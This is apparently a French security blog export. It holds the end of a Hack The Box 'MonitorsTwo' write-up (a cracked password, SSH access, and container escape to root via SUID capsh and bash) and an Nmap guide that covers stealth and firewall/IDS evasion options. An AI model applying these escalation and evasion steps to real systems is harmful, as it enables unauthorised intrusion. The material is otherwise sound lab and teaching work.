de 10min nous obtenons un résultat pour l\u0026rsquo;utilisateur marcus :\n┌──(raizen㉿Raizen)-[~] └─$ hashcat -m 3200 --username --show hashes marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey We can now use these creds, marcus:funkymonkey, for logging into SSH:\n┌──(raizen㉿Raizen)-[~] └─$ ssh marcus@10.10.11.211 marcus@10.10.11.211\u0026#39;s password: \u0026lt;SNIP\u0026gt; You have mail. Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40 ┌──(marcus㉿monitorstwo)-[~] └─$ Élevation de privilèges #\rNous pouvons maintenant utiliser ces identifiants marcus:funkymonkey pour nous connecter via SSH :\n┌──(marcus㉿monitorstwo)-[~] └─$ cat user.txt \u0026lt;********************************\u0026gt; À ce niveau nous retournons donc comme la première fois dans le dossier /var/mail/ où nous trouverons le mail de l\u0026rsquo;admin destiné aux utilisateurs du système et faisant mention de trois CVE, dont seul le dernier concernant une version de contenant vulnérable sera exploitable dans notre cas:\n┌──(marcus㉿monitorstwo)-[~] └─$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all,... La description de la vulnérabilité fait référence aux répertoires sous /var/lib/docker/, donc nous ne sommes intéressés que par ceux-ci.\n# Listage des conteneurs Docker ┌──(marcus㉿monitorstwo)-[~] └─$ findmnt TARGET SOURCE FSTYPE OPTIONS \u0026lt;SNIP\u0026gt; │ nsfs rw ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm │ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k Nous devons déterminer le conteneur associé à l\u0026rsquo;application Cacti, car notre session de shell conteneurisé se trouve à l\u0026rsquo;intérieur de celui-ci. Nous pouvons le faire en créant un fichier depuis notre session de shell conteneurisé (notre point d\u0026rsquo;entrée initial), puis vérifier si ce fichier est disponible depuis l\u0026rsquo;extérieur du conteneur avec marcus.\n# Déplaçons nous vers le répertoire /tmp et créons un fichier test www-data@50bca5e748b0:/var/www/html$ cd /tmp www-data@50bca5e748b0:/tmp$ touch test Les contenus les plus lourds sont généralement des images, et si le pilote de stockage par défaut overlay2 est utilisé, alors ces images Docker sont stockées dans /var/lib/docker/overlay2 (freecodecamp). Par conséquent, nous devons juste vérifier 2 des 4 chemins de conteneurs trouvés ci-dessus :\nNous pouvons vérifier chacun de ces 2 conteneurs séquentiellement pour voir lequel contient le fichier test :\n┌──(marcus㉿monitorstwo)-[~] └─$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test ls: cannot access \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test\u0026#39;: No such file or directory ┌──(marcus㉿monitorstwo)-[~] └─$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test -rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test Le conteneur Cacti est donc: c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1. Maintenant, nous devons attribuer des permissions SUID à /bin/bash, afin que marcus puisse l\u0026rsquo;exécuter depuis l\u0026rsquo;extérieur et obtenir un shell root. Pour ce faire, nous devons d\u0026rsquo;abord élever nos privilèges à l\u0026rsquo;intérieur du conteneur.\nCelà se fera comme dans la première méthodologie en recherchant les fichiers avec un bit SUID:\nwww-data@50bca5e748b0:/tmp$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su En suivant les instruction d\u0026rsquo;exploitation du binaire /sbin/capsh comme indiqué sur Gtfobins nous obtenons notre accès root:\n#root www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 -- root@50bca5e748b0:/tmp# id uid=0(root) gid=0(root) groups=0(root),33(www-data) Étant root nous pouvons donc assigner le bit SUID au binaire /bin/bash: # assignation de permission SUID root@50bca5e748b0:/tmp# chmod u+s /bin/bash # vérification root@50bca5e748b0:/tmp# ls -l /bin/bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash Enfin, nous pouvons retourner à la session SSH de marcus et exécuter le binaire bash en utilisant l\u0026rsquo;option -p (link)\nflag:\n┌──(marcus㉿monitorstwo)-[~] └─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 bash ┌──(marcus㉿monitorstwo)-[/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin] └─$ ./bash -p bash-5.1# id uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus) bash-5.1# cat /root/root.txt \u0026lt;********************************\u0026gt; ","date":"16 December 2023","externalUrl":null,"permalink":"/posts/htb-monitorstwo/","section":"Posts","summary":"MonitorsTwo est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant la kill-chain\u0026hellip;","title":"MonitorsTwo (HTB)","type":"posts"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/","section":"Raizen | Blog","summary":"","title":"Raizen | Blog","type":"page"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/categories/markdown/","section":"Categories","summary":"","title":"Markdown","type":"categories"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network-analysis/","section":"Tags","summary":"","title":"Network Analysis","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/nmap/","section":"Tags","summary":"","title":"Nmap","type":"tags"},{"content":"Dans le cadre des tests d\u0026rsquo;intrusion (pentesting) et des défis CTF (Capture The Flag), la phase d\u0026rsquo;énumération constitue une étape essentielle. C\u0026rsquo;est ici que Nmap, un outil incontournable pour les professionnels de la sécurité informatique, entre en scène.\nNmap, abréviation de Network Mapper, est un utilitaire puissant et polyvalent, utilisé tant par les administrateurs réseau que par les experts en cybersécurité pour analyser, explorer et sécuriser les infrastructures réseau.\nQue ce soit pour auditer la sécurité d\u0026rsquo;un réseau interne, identifier les dispositifs connectés ou évaluer la surface d\u0026rsquo;attaque d\u0026rsquo;un réseau distant, Nmap est un outil privilégié. Ses fonctionnalités avancées permettent de cartographier les hôtes d\u0026rsquo;un réseau, de détecter les ports ouverts, d\u0026rsquo;identifier les services actifs, et bien plus encore.\nDans ce guide, nous explorerons les différentes options d\u0026rsquo;analyse qu\u0026rsquo;offre Nmap, et nous examinerons leur pertinence dans divers contextes de sécurité. I- Analyse du Réseau #\rAvant d\u0026rsquo;explorer les techniques avancées de scan de ports offertes par Nmap, il est crucial de comprendre le fonctionnement général de cet outil et de se familiariser avec la syntaxe d\u0026rsquo;une commande standard ainsi que ses options par défaut.\nFonctionnement Général de Nmap L\u0026rsquo;outil Nmap fonctionne en envoyant des paquets réseau à la cible et se sert de l\u0026rsquo;analyse des réponses pour déterminer entre autres quels ports sont ouverts, quels services sont en cours d\u0026rsquo;exécution sur ces ports, et quelles sont les adresses IP des hôtes actifs sur le réseau. Il utilise différentes techniques de scan (que nous verront dans la section suivante) pour accomplir ces tâches. Chacune de ces techniques ayant leurs propres utilités, avantages et inconvénients en termes de discrétion, vitesse et détection.\nCommande Standard de Nmap La structure d\u0026rsquo;une commande Nmap est généralement la suivante :\nnmap [options] [cibles]\nLes options permettent de spécifier les paramètres du scan, tels que les techniques de scan à utiliser, les types de ports à scanner, etc. Les cibles désignent les adresses IP ou les plages d\u0026rsquo;adresses à scanner.\nII- Techniques de Scans #\rScan SYN (-sS): Ce type de scan envoie un paquet SYN sans finaliser la connexion TCP, ce qui le rend discret et difficile à détecter. Il est particulièrement utile pour les tests d\u0026rsquo;intrusion furtifs, mais nécessite souvent des privilèges administratifs.\nScan Connecté (-sT): Contrairement au scan SYN, ce scan établit une connexion complète via TCP. Bien qu\u0026rsquo;il laisse une trace, il peut être exécuté sans privilèges élevés.\nScan UDP (-sU): Ce scan teste les ports UDP, souvent utilisés par des services tels que DNS (port 53), SNMP (ports 161/163) et DHCP (ports 67/68). Il est généralement plus lent que le scan TCP en raison de la nature non connectée du protocole UDP.\nScan SCTP INIT (-sY): Ce scan utilise le protocole SCTP, en envoyant un paquet INIT sans établir de connexion, similaire au SYN scan pour TCP. Il est utile pour éviter la journalisation des connexions.\nScans Null (-sN), Fin (-sF), et Xmas (-sX): Ces scans envoient des paquets avec des combinaisons spécifiques de flags TCP (aucun, FIN, ou un ensemble de flags inhabituels) pour contourner certains pare-feu et extraire des informations sur les ports ouverts.\nScan Maimon (-sM): Ce scan envoie des paquets avec les flags FIN et ACK, principalement destiné aux systèmes BSD. Cependant, il peut souvent rapporter tous les ports comme étant fermés dans les systèmes actuels.\nScans ACK (-sA) et Window (-sW): Utilisés pour identifier la présence de pare-feu, ces scans se basent sur la manière dont les pare-feu réagissent aux paquets ACK et sur l\u0026rsquo;analyse des tailles de fenêtre TCP.\nScan Idle (-sI): Ce scan permet une reconnaissance discrète en utilisant un hôte intermédiaire. Il est efficace lorsque certaines adresses IP ne sont pas filtrées par le pare-feu.\nOption \u0026ndash;badsum: Envoie des paquets avec une somme de contrôle incorrecte pour provoquer des réponses inattendues des pare-feu, révélant potentiellement des informations sur leur configuration.\nScan SCTP Weird (-sZ): Conçu pour contourner les pare-feu, ce scan est cependant limité par son incapacité à distinguer les ports filtrés des ports ouverts.\nScan de Protocole IP (-sO): Ce scan envoie des en-têtes IP mal formés pour détecter les protocoles IP supportés par la cible.\nScan par FTP Bounce (-b ): Permet de scanner une cible via un serveur FTP intermédiaire. Bien que peu utilisé dans la pratique, il reste une technique intéressante pour certains environnements spécifiques.\nDécouverte d\u0026rsquo;Équipement #\rLors de la phase de découverte, Nmap utilise par défaut une combinaison de techniques pour identifier les équipements actifs sur le réseau. Ces techniques incluent les options suivantes : -PA80, -PS443, -PE, et -PP, qui spécifient les sondes utilisées par Nmap pour cette étape.\nPA80 : Envoie des paquets TCP SYN vers le port 80 (HTTP) pour tenter d\u0026rsquo;établir une connexion. Le port 80 étant largement utilisé pour les serveurs web, cette option permet de vérifier la disponibilité des hôtes exécutant des services HTTP.\nPS443 : Envoie des paquets TCP SYN vers le port 443 (HTTPS), utilisé pour les connexions sécurisées. Cela permet de tester la connectivité des hôtes via des services HTTPS.\nPE : Envoie des paquets ICMP Echo Request (requête de ping) pour vérifier la disponibilité des hôtes de manière non intrusive.\nPP : Envoie des paquets ICMP Timestamp Request pour tester la connectivité, offrant une autre méthode discrète pour identifier les hôtes actifs.\nEn combinant ces sondes, Nmap est capable d\u0026rsquo;identifier les équipements actifs sur le réseau, ce qui permet ensuite de procéder à des analyses plus approfondies des ports et des services.\nAutres options de découverte #\rsL : Ce scan non intrusif effectue des requêtes DNS pour la résolution des noms, ce qui permet de lister les cibles sans envoyer de paquets aux hôtes directement. Il s\u0026rsquo;agit d\u0026rsquo;une approche discrète pour recenser les équipements.\nPn : Désactive le ping, instructant Nmap de ne pas vérifier la disponibilité des hôtes via ICMP. Utile lorsque vous savez que les cibles sont actives mais ne répondent pas aux requêtes de ping.\nsn : Réalise uniquement la découverte d\u0026rsquo;hôtes sans effectuer de scan de ports, ce qui le rend discret et efficace pour une cartographie rapide du réseau.\nPR : Utilise un ping ARP pour identifier les hôtes actifs sur un réseau local. Cette méthode est souvent utilisée par défaut sur les réseaux Ethernet, car elle est précise et rapide dans un environnement local.\n-PM : Effectue un ping ICMP Address Mask Request pour vérifier si l\u0026rsquo;hôte est actif.\nPS \u0026lt;ports\u0026gt; : Envoie des paquets SYN à des ports spécifiques pour tester leur connectivité. Les réponses permettent de déterminer si le port est ouvert, fermé, ou filtré.\nPA \u0026lt;ports\u0026gt; : Semblable à PS, mais en utilisant des paquets ACK pour tester les ports. Cette méthode peut être utilisée en complément pour obtenir des informations supplémentaires.\nPU \u0026lt;ports\u0026gt; : Envoie des sondes à des ports supposés fermés pour tester la réaction des pare-feu, une technique utile pour la détection des dispositifs de filtrage.\nPY \u0026lt;ports\u0026gt; : Envoie des sondes SCTP INIT pour déterminer l\u0026rsquo;état des ports (ouvert, fermé ou injoignable), généralement sur le port 80 par défaut.\nPO \u0026lt;protocols\u0026gt; : Spécifie les protocoles à inclure dans les en-têtes des paquets, par exemple ICMP (1), IGMP (2), ou Encap IP (4).\n-n : Désactive la résolution DNS, ce qui permet d\u0026rsquo;accélérer le scan en évitant de résoudre les noms d\u0026rsquo;hôtes associés aux adresses IP.\n-R : Force la résolution DNS pour toutes les cibles, garantissant ainsi que les noms d\u0026rsquo;hôtes sont inclus dans les résultats du scan.\nOptions de Ports #\r-p \u0026lt;ports\u0026gt; : Permet de spécifier les ports à scanner. Cette option est suivie de la liste des ports ou des plages que vous souhaitez analyser. Par exemple, pour scanner tous les ports, utilisez -p- ou -p all.\n-F : Effectue un scan rapide en ne vérifiant que les 100 ports les plus couramment utilisés, réduisant ainsi le temps d\u0026rsquo;analyse.\n--top-ports \u0026lt;nombre\u0026gt; : Spécifie le nombre de ports les plus courants à analyser, de 1 à 65 535, en fonction de leur fréquence d’utilisation sur les réseaux.\n-r : Force Nmap à scanner les ports dans un ordre séquentiel (et non aléatoire), ce qui peut être utile pour des tests de performance ou pour éviter certaines stratégies de détection de scan.\n--port-ratio \u0026lt;ratio\u0026gt; : Permet de focaliser l\u0026rsquo;analyse sur les ports les plus communément ouverts, en spécifiant un ratio entre 0 et 1. Cela peut optimiser les scans en se concentrant sur les ports les plus susceptibles d’être actifs.\nScan de Version (-sV) #\r-sV : Cette option permet à Nmap d\u0026rsquo;identifier les versions des services actifs sur les ports ouverts. Elle envoie des sondes spécifiques pour obtenir des informations détaillées sur les services. Vous pouvez ajuster l\u0026rsquo;intensité du scan de version, sur une échelle de 0 à 9, avec une valeur par défaut de 7.\n--version-intensity \u0026lt;nombre\u0026gt; : Permet de contrôler l\u0026rsquo;intensité du scan de version. Une intensité plus faible lancera uniquement les sondes les plus probables, ce qui peut réduire la durée du scan, notamment dans le cadre de scans UDP.\nDétection d\u0026rsquo;OS (-O) #\r-O : Cette option active la détection du système d\u0026rsquo;exploitation (OS) en analysant les réponses des paquets réseau. Nmap tente d\u0026rsquo;identifier l\u0026rsquo;OS en fonction des caractéristiques des hôtes.\n--osscan-limit : Limite la détection d\u0026rsquo;OS si moins de deux ports (un ouvert et un fermé) sont détectés. Cela permet de réduire le temps de scan si les conditions d\u0026rsquo;analyse ne sont pas optimales.\n--osscan-guess : Améliore la précision de la détection en cas d\u0026rsquo;incertitude, en effectuant une analyse plus approfondie des réponses réseau. Cette option force Nmap à faire des prédictions même si les résultats sont partiels.\nIII- Scripts #\rL\u0026rsquo;option --script de Nmap permet d\u0026rsquo;exécuter des scripts pendant les scans, augmentant ainsi la capacité de collecte d\u0026rsquo;informations. Ces scripts, appelés Nmap Scripting Engine (NSE), peuvent être spécifiés de différentes manières : par nom de fichier, catégorie, répertoire ou à l\u0026rsquo;aide d\u0026rsquo;expressions régulières. Vous pouvez aussi exécuter des scripts prédéfinis via les options suivantes :\n-sC ou \u0026ndash;script=default : Exécute les scripts par défaut, équivalents à --script=default, conçus pour fournir un bon aperçu des vulnérabilités sans être trop intrusifs. Catégories de scripts disponibles #\rLes scripts NSE sont organisés en différentes catégories, chacune visant à analyser un aspect particulier de la cible :\nAuth : Scripts pour tester les mécanismes d\u0026rsquo;authentification. Default : Ensemble de scripts par défaut qui fournissent un bon point de départ pour des analyses initiales. Discovery : Scripts de découverte permettant d\u0026rsquo;obtenir des informations supplémentaires sur la cible. External : Scripts s\u0026rsquo;appuyant sur des ressources externes pour analyser la cible. Intrusive : Scripts pouvant provoquer des modifications ou un comportement inattendu sur la cible. Malware : Scripts qui détectent les indicateurs de compromission (IoC) associés à des logiciels malveillants. Safe : Scripts non intrusifs garantissant qu\u0026rsquo;aucune modification n\u0026rsquo;est apportée à la cible. Vuln : Scripts dédiés à la détection de vulnérabilités connues. All : Exécute l\u0026rsquo;ensemble des scripts NSE disponibles. Recherche et filtrage des scripts #\rPour affiner la sélection des scripts à utiliser, Nmap permet de rechercher des scripts spécifiques grâce à l\u0026rsquo;option --script-help. Celle-ci permet d\u0026rsquo;afficher des informations sur des scripts en fonction de leur nom, catégorie ou comportement. Exemples de recherches :\nnmap --script-help=\u0026quot;http-*\u0026quot; : Affiche tous les scripts dont le nom commence par \u0026ldquo;http-\u0026rdquo;. nmap --script-help=\u0026quot;not intrusive\u0026quot; : Exclut les scripts intrusifs et liste les autres. nmap --script-help=\u0026quot;default or safe\u0026quot; : Affiche les scripts appartenant aux catégories \u0026ldquo;default\u0026rdquo; ou \u0026ldquo;safe\u0026rdquo;. nmap --script-help=\u0026quot;default and safe\u0026quot; : Affiche les scripts qui sont à la fois dans les catégories \u0026ldquo;default\u0026rdquo; et \u0026ldquo;safe\u0026rdquo;. nmap --script-help=\u0026quot;(default or safe or intrusive) and not http-*\u0026quot; : Affiche les scripts des catégories \u0026ldquo;default\u0026rdquo;, \u0026ldquo;safe\u0026rdquo; ou \u0026ldquo;intrusive\u0026rdquo; mais exclut ceux liés au protocole HTTP. Utilisation des arguments de scripts #\rCertains scripts NSE peuvent recevoir des arguments pour personnaliser leur fonctionnement. Vous pouvez les spécifier via l\u0026rsquo;option --script-args, qui permet de passer des valeurs spécifiques à des paramètres de scripts :\nnmap --script-args «n1»=«v1»,«n2»={_«n3»=«v3»},«n4»={_«v4»_,_«v5»} : Permet de définir plusieurs ensembles d\u0026rsquo;arguments. Si vous avez une configuration plus complexe ou des ensembles d\u0026rsquo;arguments récurrents, il est possible de les fournir à partir d\u0026rsquo;un fichier texte en utilisant --script-args-file, ce qui est particulièrement pratique pour les configurations automatisées.\nAide, débogage et mise à jour des scripts #\r\u0026ndash;script-help «nom_fichier» | «catégorie» | «répertoire» | «expression» | all : Cette option affiche de l\u0026rsquo;aide sur les scripts en fonction du fichier, de la catégorie, du répertoire, ou d\u0026rsquo;une expression régulière. Spécifier \u0026ldquo;all\u0026rdquo; affiche l\u0026rsquo;aide pour tous les scripts disponibles. \u0026ndash;script-trace : Active le traçage détaillé de l\u0026rsquo;exécution des scripts, fournissant des informations précieuses pour le débogage ou la compréhension des interactions entre les scripts et la cible. \u0026ndash;script-updatedb : Met à jour la base de données des scripts NSE installés, nécessaire lorsque vous ajoutez de nouveaux scripts ou effectuez des mises à jour sur les scripts existants. IV- Contrôle du Temps et de l\u0026rsquo;Aggressivité des Scans #\rNmap propose plusieurs options pour ajuster le contrôle du temps et l\u0026rsquo;agressivité des scans, permettant ainsi de mieux gérer les ressources et d\u0026rsquo;adapter les performances en fonction des besoins spécifiques.\nContrôle du Temps #\rNmap permet de configurer les délais et les performances des scans en utilisant des unités de temps variées (millisecondes, secondes, minutes) :\nTemps de scan ajustable : Vous pouvez définir le temps en utilisant des arguments tels que --host-timeout, qui accepte des formats variés : 900000ms, 900, 900s, et 15m effectuent tous la même tâche, soit un délai de 15 minutes.\nContrôle des groupes d\u0026rsquo;hôtes :\n--min-hostgroup «numhosts» et --max-hostgroup «numhosts» permettent de définir la taille des groupes d\u0026rsquo;hôtes analysés simultanément. Contrôle du parallélisme :\n--min-parallelism «numprobes» et --max-parallelism «numprobes» contrôlent le nombre de sondes envoyées en parallèle. Temps de réponse RTT (Round Trip Time) :\n--min-rtt-timeout «time», --max-rtt-timeout «time», et --initial-rtt-timeout «time» permettent d\u0026rsquo;ajuster les délais de réponse pour les connexions. Nombre de tentatives :\n--max-retries «numtries» ajuste le nombre de tentatives avant d\u0026rsquo;abandonner une connexion. Délai entre scans :\n--scan-delay «time» et --max-scan-delay «time» modifient le délai entre chaque test envoyé à un hôte. Taux d\u0026rsquo;envoi de paquets :\n--min-rate «number» et --max-rate «number» ajustent le nombre de paquets envoyés par seconde, ce qui peut influencer la vitesse du scan. Bypass des limites RST :\n--defeat-rst-ratelimit permet d\u0026rsquo;ignorer les limitations de réponse RST (Reset) sur certains réseaux, accélérant ainsi le scan. Contrôle de l\u0026rsquo;Aggressivité #\rL\u0026rsquo;option -T dans Nmap ajuste le niveau d\u0026rsquo;agressivité du scan en modifiant divers paramètres comme les délais, le parallélisme, et la gestion des ressources. Les niveaux d\u0026rsquo;agressivité sont définis comme suit :\n-T0 (paranoid) : Effectue un test à la fois, en introduisant un délai de 5 minutes entre chaque test. Utilisé pour des scans extrêmement furtifs. -T1 (sneaky) : Ajoute un délai de 15 secondes entre chaque test. -T2 (polite) : Réduit le délai à 0,4 seconde, tout en restant discret. -T3 (normal) : Niveau par défaut, équilibrant vitesse et utilisation des ressources. -T4 (aggressive) : Optimise le scan pour une vitesse accrue tout en limitant l\u0026rsquo;impact réseau, adapté pour des scans relativement rapides sans trop de risques. -T5 (insane) : Utilise toutes les ressources disponibles pour un scan aussi rapide que possible. Ce niveau est le plus rapide mais aussi le plus intrusif, présentant des risques accrus de détection et de perturbation. V- Firewall/IDS: Options de Masquage et de Fragmentation dans Nmap #\rNmap offre des fonctionnalités avancées pour contourner les systèmes de sécurité tels que les pare-feu et les systèmes de détection d\u0026rsquo;intrusion (IDS). Voici quelques-unes des principales options que vous pouvez utiliser pour améliorer la discrétion de vos scans.\nFragmentation des Paquets #\rOption -f : Cette option permet de fragmenter les paquets envoyés lors du scan. Par défaut, Nmap divise les paquets en morceaux de 8 octets après l\u0026rsquo;en-tête. Si vous souhaitez spécifier une taille de fragment différente, vous pouvez utiliser l\u0026rsquo;option ..mtu, tout en veillant à ce que le décalage soit un multiple de 8. Il est important de noter que la fragmentation n\u0026rsquo;est pas prise en charge par les scanners de version et les scripts Nmap. Masquage d\u0026rsquo;Adresse IP #\rMasquage d\u0026rsquo;Adresse avec -D :\nSyntaxe : -D decoy1,decoy2,ME Cette option permet à Nmap d\u0026rsquo;envoyer des scans en utilisant d\u0026rsquo;autres adresses IP comme origine, ce qui aide à dissimuler votre adresse IP réelle. En ajoutant ME à la liste, vous indiquez à Nmap que vous souhaitez inclure votre adresse IP. Il est recommandé de positionner 5 à 6 adresses IP fictives avant la vôtre pour obtenir un masquage optimal. Vous pouvez également générer des adresses IP aléatoires à l\u0026rsquo;aide de l\u0026rsquo;option RND:«nombre», où «nombre» représente le nombre d\u0026rsquo;adresses IP à générer. Il est à noter que ces adresses ne fonctionneront pas avec la détection de versions sans connexion TCP. Sur un réseau, il est conseillé d\u0026rsquo;utiliser des adresses IP qui sont actives ; sinon, il sera facile de déterminer que vous êtes l\u0026rsquo;unique hôte actif. Utilisation d\u0026rsquo;adresses IP aléatoires :\nPar exemple, vous pouvez exécuter la commande suivante pour utiliser des adresses IP aléatoires lors d\u0026rsquo;un scan : nmap -D RND:10 Ip_cible Spécification de l\u0026rsquo;Adresse Source et Options Réseau dans Nmap #\rNmap offre une variété d\u0026rsquo;options pour spécifier des adresses IP, sélectionner des interfaces réseau et configurer des paquets, ce qui permet d\u0026rsquo;adapter les scans à différents environnements et besoins.\nSpécification de l\u0026rsquo;Adresse Source #\rOption -S IP : Cette option permet de définir l\u0026rsquo;adresse IP source des paquets envoyés par Nmap. Elle est particulièrement utile lorsque Nmap ne parvient pas à détecter automatiquement votre adresse IP ou lorsque vous souhaitez faire croire qu\u0026rsquo;un autre hôte réalise le scan. Sélection de l\u0026rsquo;Interface Réseau #\rOption -e «interface» : Cette option permet de sélectionner l\u0026rsquo;interface réseau spécifique à utiliser pour le scan. Pratiques de Sécurité #\rIl est bon de noter que certains administrateurs réseau préfèrent laisser de nombreux ports ouverts, tels que les ports DNS ou FTP par exemple, plutôt que de rechercher des solutions alternatives. Cela peut exposer le réseau à des vulnérabilités. Pour explorer ces failles potentielles, Nmap propose des options telles que --source-port «numéro de port» et -g «numéro de port», qui sont équivalentes et permettent d\u0026rsquo;exploiter ces ports.\nVI- Options Avancées pour les Paquets #\r--data «chaîne hexadécimale» : Permet d\u0026rsquo;envoyer des données sous forme de texte en utilisant le format hexadécimal.\n--data-string «chaîne» : Permet d\u0026rsquo;envoyer des données sous forme de texte normal.\n--data-length «nombre» : Spécifie la longueur des données à envoyer. Nmap enverra uniquement les en-têtes et ajoutera un nombre spécifié d\u0026rsquo;octets supplémentaires de manière aléatoire.\n--ip-options : Utilisez cette option pour configurer entièrement les options du paquet IP.\n--packet-trace : Affiche les informations sur les paquets envoyés et reçus, ce qui peut être utile pour le débogage.\n--ttl «valeur» : Permet de spécifier la valeur TTL (Time to Live) des paquets envoyés.\n--randomize-hosts : Rend le scan moins évident en randomisant l\u0026rsquo;ordre des cibles, ce qui contribue à dissimuler les activités.\n--spoof-mac «adresse MAC, préfixe ou nom de fournisseur» : Change l\u0026rsquo;adresse MAC utilisée lors du scan, en spécifiant une adresse MAC, un préfixe ou le nom d\u0026rsquo;un fournisseur.\n--proxies «liste d'URL de proxy séparées par des virgules» : Utilisez cette option pour effectuer des scans à travers des proxys. Notez qu\u0026rsquo;un proxy peut ne pas maintenir autant de connexions ouvertes que Nmap le désire ; par conséquent, il peut être nécessaire de modifier le parallélisme avec l\u0026rsquo;option --max-parallelism.\n-sP : Utilisez cette option pour découvrir les hôtes dans un réseau à l\u0026rsquo;aide de l\u0026rsquo;ARP (Address Resolution Protocol).\nVII- Options de Sortie dans Nmap #\rNmap propose plusieurs options pour personnaliser la sortie des résultats de scan. Ces options permettent de stocker les données dans différents formats, facilitant ainsi l\u0026rsquo;analyse ultérieure ou l\u0026rsquo;intégration dans d\u0026rsquo;autres outils.\nOptions de Sortie #\r-oN file : Génère une sortie normale dans le fichier spécifié, offrant une vue lisible et structurée des résultats.\n-oX file : Produit une sortie au format XML dans le fichier spécifié, idéale pour les traitements automatisés et l\u0026rsquo;intégration avec d\u0026rsquo;autres outils d\u0026rsquo;analyse.\n-oS file : Crée une sortie conçue pour les utilisateurs peu expérimentés (souvent appelés \u0026ldquo;script kiddies\u0026rdquo;), facilitant la compréhension des résultats.\n-oG file : Produit une sortie au format greppable, permettant une recherche facile et rapide à l\u0026rsquo;aide d\u0026rsquo;outils de ligne de commande.\n-oA file : Génère toutes les sorties, sauf celle destinée aux script kiddies, dans le fichier spécifié. Cela inclut les formats normal, XML et greppable.\nOptions de Verbosité et de Débogage #\r-v level : Définit le niveau de verbosité de la sortie, permettant d\u0026rsquo;ajuster la quantité d\u0026rsquo;informations affichées pendant le scan.\n-d level : Spécifie le niveau de débogage, fournissant des détails supplémentaires sur le fonctionnement interne de Nmap, ce qui peut être utile pour résoudre des problèmes.\nOptions d\u0026rsquo;Affichage d\u0026rsquo;État et de Statistiques #\r--reason : Affiche la raison derrière l\u0026rsquo;état de chaque hôte, fournissant un contexte pour les résultats du scan.\n--stats-every time : Affiche les statistiques à intervalles réguliers pendant l\u0026rsquo;exécution du scan, permettant de suivre l\u0026rsquo;évolution du processus.\n--packet-trace : Montre les paquets envoyés et reçus, ce qui peut être utile pour le débogage ou pour mieux comprendre le comportement du scan.\n--open : Affiche uniquement les ports ouverts et leur état, facilitant ainsi la concentration sur les éléments importants des résultats.\n--resume file : Permet de reprendre une analyse à partir d\u0026rsquo;un fichier de reprise, ce qui est particulièrement utile pour les scans longs ou complexes.\nNmap propose un ensemble d\u0026rsquo;options supplémentaires qui améliorent la flexibilité et la fonctionnalité du scan. Ces options permettent d\u0026rsquo;adapter Nmap à des environnements variés et de répondre à des besoins spécifiques.\nVIII- Options Diverses #\r-6 : Active la prise en charge du protocole IPv6, permettant ainsi d\u0026rsquo;analyser des cibles utilisant ce protocole.\n-A : Exécute un ensemble de fonctionnalités avancées, équivalent à la combinaison de -O (détection du système d\u0026rsquo;exploitation), -sV (détection de version), -sC (exécution des scripts par défaut) et --traceroute (détermination du chemin vers l\u0026rsquo;hôte).\nModification des Options en Cours 